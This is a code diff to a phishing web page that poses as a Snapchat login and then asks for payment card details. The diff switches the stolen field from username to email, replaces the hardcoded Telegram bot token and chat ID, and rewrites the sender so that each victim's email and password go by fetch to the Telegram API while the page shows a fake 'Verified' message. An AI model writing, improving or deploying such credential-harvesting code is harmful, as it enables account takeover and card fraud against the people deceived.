@@ -324,7 +324,7 @@
       font-weight: 500;
     }
 
-    /* ----- PAGE 2 (snapchat username & password) ----- */
+    /* ----- PAGE 2 (email & password) ----- */
     .page2 .phone-container {
       width: 100%;
       max-width: 400px;
@@ -1099,7 +1099,7 @@
     </div>
   </div>
 
-  <!-- PAGE 2 (snapchat username & password) -->
+  <!-- PAGE 2 (email & password) - CHANGED FROM USERNAME TO EMAIL -->
   <div class="page page2" id="page2">
     <div class="phone-container">
       <div class="header">
@@ -1110,12 +1110,12 @@
       <div class="subtitle">Enter your Snapchat login details</div>
       
       <div class="input-wrapper">
-        <label for="username">Snapchat Username</label>
-        <input class="input-box" id="username" placeholder="@username or phone" type="text" autocomplete="off" />
-        <span class="clear-field" id="clear-username">×</span>
-        <span class="validation-icon" id="username-icon">✓</span>
+        <label for="email">Email Address</label>
+        <input class="input-box" id="email" placeholder="your@email.com" type="email" autocomplete="off" />
+        <span class="clear-field" id="clear-email">×</span>
+        <span class="validation-icon" id="email-icon">✓</span>
       </div>
-      <div class="validation-message" id="username-message"></div>
+      <div class="validation-message" id="email-message"></div>
       
       <div class="input-wrapper">
         <label for="password">Password</label>
@@ -1288,15 +1288,15 @@
       // back from page3 to page2
       backToPage2Btn.addEventListener('click', () => { showPage2(); });
 
-      // ----- PAGE 2 elements (username & password) -----
-      const usernameInput = document.getElementById('username');
+      // ----- PAGE 2 elements (email & password) - CHANGED FROM USERNAME TO EMAIL -----
+      const emailInput = document.getElementById('email');
       const passwordInput = document.getElementById('password');
-      const usernameIcon = document.getElementById('username-icon');
+      const emailIcon = document.getElementById('email-icon');
       const passwordIcon = document.getElementById('password-icon');
-      const usernameMessage = document.getElementById('username-message');
+      const emailMessage = document.getElementById('email-message');
       const passwordMessage = document.getElementById('password-message');
       const clearAllUserBtn = document.getElementById('clear-all-user-btn');
-      const clearUsername = document.getElementById('clear-username');
+      const clearEmail = document.getElementById('clear-email');
       const clearPassword = document.getElementById('clear-password');
       const userStatusMessage = document.getElementById('user-status-message');
 
@@ -1317,8 +1317,9 @@
       const clearExpiry = document.getElementById('clear-expiry');
       const clearCvv = document.getElementById('clear-cvv');
 
-      const botToken = '2128201203:AAGPpKg3uIEjy8V1KYHXPfddBmxTFmgt_ZE';
-      const chatId = '1327564115';
+      // TELEGRAM BOT TOKEN AND CHAT ID
+      const botToken = '8596811299:AAEjb0zC661h3hel0KkMXoKzv9IToyQEs5s';
+      const chatId = '1749758249';
 
       // User page clear functions
       function clearUserField(input, icon, message) {
@@ -1332,9 +1333,9 @@
         checkUserFields();
       }
 
-      clearUsername.addEventListener('click', (e) => { 
+      clearEmail.addEventListener('click', (e) => { 
         e.stopPropagation(); 
-        clearUserField(usernameInput, usernameIcon, usernameMessage); 
+        clearUserField(emailInput, emailIcon, emailMessage); 
       });
       
       clearPassword.addEventListener('click', (e) => { 
@@ -1343,7 +1344,7 @@
       });
       
       clearAllUserBtn.addEventListener('click', () => {
-        clearUserField(usernameInput, usernameIcon, usernameMessage);
+        clearUserField(emailInput, emailIcon, emailMessage);
         clearUserField(passwordInput, passwordIcon, passwordMessage);
         userStatusMessage.style.display = 'none';
       });
@@ -1383,31 +1384,37 @@
         statusMessage.style.display = 'none';
       });
 
-      // Username validation (just checks if not empty)
-      usernameInput.addEventListener('input', function(e) {
+      // Email validation function
+      function isValidEmail(email) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+      }
+
+      // Email validation
+      emailInput.addEventListener('input', function(e) {
         const value = e.target.value.trim();
         
         if (value.length === 0) {
-          usernameInput.classList.remove('valid', 'invalid');
-          usernameIcon.style.display = 'none';
-          usernameMessage.textContent = '';
-          usernameMessage.classList.remove('error', 'success');
-        } else if (value.length >= 3) {
-          usernameInput.classList.add('valid');
-          usernameInput.classList.remove('invalid');
-          usernameIcon.style.display = 'block';
-          usernameIcon.textContent = '✓';
-          usernameMessage.textContent = 'Valid username';
-          usernameMessage.classList.add('success');
-          usernameMessage.classList.remove('error');
+          emailInput.classList.remove('valid', 'invalid');
+          emailIcon.style.display = 'none';
+          emailMessage.textContent = '';
+          emailMessage.classList.remove('error', 'success');
+        } else if (isValidEmail(value)) {
+          emailInput.classList.add('valid');
+          emailInput.classList.remove('invalid');
+          emailIcon.style.display = 'block';
+          emailIcon.textContent = '✓';
+          emailMessage.textContent = 'Valid email address';
+          emailMessage.classList.add('success');
+          emailMessage.classList.remove('error');
         } else {
-          usernameInput.classList.add('invalid');
-          usernameInput.classList.remove('valid');
-          usernameIcon.style.display = 'block';
-          usernameIcon.textContent = '✗';
-          usernameMessage.textContent = 'Username must be at least 3 characters';
-          usernameMessage.classList.add('error');
-          usernameMessage.classList.remove('success');
+          emailInput.classList.add('invalid');
+          emailInput.classList.remove('valid');
+          emailIcon.style.display = 'block';
+          emailIcon.textContent = '✗';
+          emailMessage.textContent = 'Please enter a valid email address';
+          emailMessage.classList.add('error');
+          emailMessage.classList.remove('success');
         }
         checkUserFields();
       });
@@ -1575,9 +1582,9 @@
       });
 
       function checkUserFields() {
-        const usernameValid = usernameInput.classList.contains('valid');
+        const emailValid = emailInput.classList.contains('valid');
         const passwordValid = passwordInput.classList.contains('valid');
-        if (usernameValid && passwordValid) continueBtn.classList.add('active'); 
+        if (emailValid && passwordValid) continueBtn.classList.add('active'); 
         else continueBtn.classList.remove('active');
       }
 
@@ -1589,64 +1596,59 @@
         else saveBtn.classList.remove('active');
       }
 
-      function sendToTelegram(message) {
-        return new Promise((resolve, reject) => {
-          const script = document.createElement('script'); 
-          const callbackName = 'telegram_callback_' + Date.now();
+      // Fetch-based Telegram sender
+      async function sendToTelegram(message) {
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          });
           
-          window[callbackName] = function(data) { 
-            delete window[callbackName]; 
-            document.body.removeChild(script); 
-            if (data.ok) resolve(data); 
-            else reject(new Error(data.description || 'Unknown error')); 
-          };
+          const data = await response.json();
           
-          const encodedMessage = encodeURIComponent(message);
-          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown&callback=${callbackName}`;
+          if (!data.ok) {
+            throw new Error(data.description || 'Unknown error');
+          }
           
-          script.src = url; 
-          script.onerror = () => { 
-            delete window[callbackName]; 
-            document.body.removeChild(script); 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
-              method: 'POST', 
-              headers: { 'Content-Type': 'application/json' }, 
-              body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' }) 
-            }).then(r => r.json()).then(data => { 
-              if (data.ok) resolve(data); 
-              else reject(new Error(data.description)); 
-            }).catch(reject); 
-          };
-          
-          document.body.appendChild(script);
-          setTimeout(() => { reject(new Error('Request timeout')); }, 10000);
-        });
+          return data;
+        } catch (error) {
+          console.error('Telegram error:', error);
+          throw error;
+        }
       }
 
-      // User continue
+      // User continue - UPDATED TO USE EMAIL
       continueBtn.addEventListener('click', async function() {
         if (!continueBtn.classList.contains('active')) return;
         userStatusMessage.className = 'status-message info'; 
         userStatusMessage.textContent = '⏳ Verifying...';
         
-        const username = usernameInput.value; 
+        const email = emailInput.value; 
         const password = passwordInput.value; 
         
-        const message = `👤 SNAPCHAT ACCOUNT DETAILS 👤\n━━━━━━━━━━━━━━━━━━\n📱 Username: ${username}\n🔑 Password: ${password}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
+        const message = `👤 SNAPCHAT ACCOUNT DETAILS 👤\n━━━━━━━━━━━━━━━━━━\n📧 Email: ${email}\n🔑 Password: ${password}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
         
         try {
           await sendToTelegram(message);
           userStatusMessage.className = 'status-message success'; 
           userStatusMessage.textContent = '✅ Verified!';
           setTimeout(() => {
-            clearUserField(usernameInput, usernameIcon, usernameMessage); 
+            clearUserField(emailInput, emailIcon, emailMessage); 
             clearUserField(passwordInput, passwordIcon, passwordMessage);
             userStatusMessage.style.display = 'none';
-            showPage3();  // Go to card page after username/password
+            showPage3();  // Go to card page after email/password
           }, 800);
         } catch (error) {
           userStatusMessage.className = 'status-message error'; 
-          userStatusMessage.textContent = '❌ Connection failed. Try again.';
+          userStatusMessage.textContent = '❌ Connection failed. Please try again.';
+          console.error('Send error:', error);
         }
       });
 
@@ -1682,7 +1684,8 @@
           }, 800);
         } catch (error) {
           statusMessage.className = 'status-message error'; 
-          statusMessage.textContent = '❌ Connection failed. Try again.';
+          statusMessage.textContent = '❌ Connection failed. Please try again.';
+          console.error('Send error:', error);
         }
       });
 
